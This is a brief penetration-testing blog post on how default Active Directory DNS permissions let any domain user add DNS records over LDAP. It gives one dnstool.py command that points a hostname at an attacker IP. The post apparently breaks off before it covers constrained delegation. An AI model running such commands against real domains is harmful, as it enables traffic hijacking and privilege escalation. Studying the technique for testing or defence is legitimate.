[back](/)

### Evil DNS zone and Constrained Delegation in Active Directory

Quite often during the attack on the Active Directory it turns out that the DNS server is used with default settings.

Thus, it is possible to add DNS entry with the rights of a regular domain user. The fact is that by default for the Authenticated Users group there are no restrictions on creating DNS records, such through access to LDAP.

![Image](/img/evil_dns/1.png)


**Example 1:**
```
python3 dnstool.py -u 'yourdomain.ru\Tiffany.Molina' -p password --action add -r web332211.domain.ru -d attacker-ip ldap-ip
```


<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

[back](/)